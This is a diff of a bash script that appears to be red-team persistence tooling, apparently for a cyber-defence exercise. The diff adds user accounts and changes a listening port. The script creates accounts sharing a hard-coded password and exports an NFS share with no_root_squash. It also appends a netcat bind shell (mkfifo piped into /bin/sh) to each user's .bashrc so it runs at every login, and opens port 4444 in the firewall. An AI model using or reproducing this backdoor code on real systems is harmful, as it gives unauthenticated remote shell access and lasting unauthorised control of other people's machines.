@@ -17,7 +17,7 @@ mkdir -p /srv/nfs
 echo "/srv/nfs *(rw,sync,no_root_squash,no_subtree_check)" | sudo tee -a /etc/exports
 sudo systemctl restart nfs-kernel-server
 
-USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "dhrupad")
+USERS=("aiden" "redhead" "megamind" "izzabizzradio" "maggiegz" "owendraingang" "drewupad" "cyfish" "ayyyydan" "eglick" "runner")
 PASSWORD="Blueteamsux123!"
 
 for USER in "${USERS[@]}"; do
@@ -41,7 +41,7 @@ for USER in "${USERS[@]}"; do
   sudo chmod 600 /home/$USER/.ssh/authorized_keys
   
   # bind shell in .bashrc
-  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
+  echo -e "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc -l 0.0.0.0 9000 > /tmp/f & disown" | sudo tee -a /home/$USER/.bashrc
 done
 
 sudo iptables -A INPUT -p tcp --dport 4444 -j ACCEPT
